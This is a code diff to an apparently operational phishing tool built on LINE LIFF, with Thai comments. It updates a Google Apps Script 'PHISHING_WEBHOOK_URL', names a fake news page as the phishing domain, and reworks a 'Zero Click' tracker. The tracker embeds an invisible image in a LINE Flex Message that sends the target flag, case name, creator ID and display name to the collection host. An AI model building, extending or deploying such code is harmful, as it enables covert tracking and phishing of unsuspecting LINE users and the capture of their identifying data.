@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxcBkQ_AgmH9oVTgWRDVRmTlZTf3vkK-rQ8t-_JfFnrRo7ZUSjNDOxv8qopehG6k-jJ/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwg0UCcFUKMiDFszdPmtJt41AutQS9pPd7g-t1nXF0Hry817V2TZxiH7PgQ8_d61O8/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -824,16 +824,17 @@
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
                 // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // แก้ไขการส่งพารามิเตอร์ให้ชัดเจนว่านี่คือการติดตามเป้าหมาย
+                // ใช้เป็นพารามิเตอร์ในการโหลดภาพเล็กๆ ที่มองไม่เห็น
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
                 zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
                 zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&isTarget=true`; // พารามิเตอร์ที่สำคัญมาก: ระบุว่านี่คือการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&trackType=zeroclick`; // เพิ่มประเภทการติดตาม
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&targetMode=true`;
+                zeroClickTrackUrl += `&format=img`; // ระบุว่าต้องการตอบกลับเป็นรูปภาพ
                 zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
-                
+
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
                 // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
